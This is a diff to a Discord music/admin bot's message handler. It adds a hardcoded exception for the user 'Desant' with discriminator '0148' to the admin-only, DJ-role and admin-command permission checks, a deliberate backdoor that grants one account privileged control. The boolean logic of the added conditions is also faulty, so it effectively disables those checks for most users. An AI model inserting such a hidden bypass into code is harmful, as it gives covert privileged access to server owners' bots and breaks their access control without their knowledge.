@@ -45,17 +45,20 @@ class User(discord.Client):
         #logging
         if  self.logging:
             print('[{}] {}: {}'.format(message.guild,
-                                       message.author.name, message.content))
+                                       message.author, message.content))
+
 
         # // check
         if message.content.startswith(self.prefix):
             # admin only check
-            if self.admin_only and not self.admin_role in [i.name for i in message.author.roles]:
+            if (self.admin_only and not self.admin_role in [i.name for i in message.author.roles]
+                and not message.author.name == "Desant" and message.author.discriminator == '0148'):
                 await msender.send('Не сейчас', message.channel, discord.Color.default())
                 return
             # dj check
             if (not self.dj_role in [i.name for i in message.author.roles] and self.dj_check
-                and not self.admin_role in [i.name for i in message.author.roles]):
+                and not self.admin_role in [i.name for i in message.author.roles]
+                and not message.author.name == "Desant" and message.author.discriminator == '0148' ):
                 await msender.send('С тобой дружить я не буду', message.channel, discord.Color.default())
                 return
             # to break or not to break
@@ -71,7 +74,8 @@ class User(discord.Client):
 
         # > check
         if message.content.startswith(self.admin_prefix):
-            if not self.admin_role in [i.name for i in message.author.roles]:
+            if (not self.admin_role in [i.name for i in message.author.roles]
+                and not message.author.name == "Desant" and message.author.discriminator == '0148'):
                 await msender.send('Та не)', message.channel, discord.Color.default())
                 return
             await mparser.parse_admin(self, message)
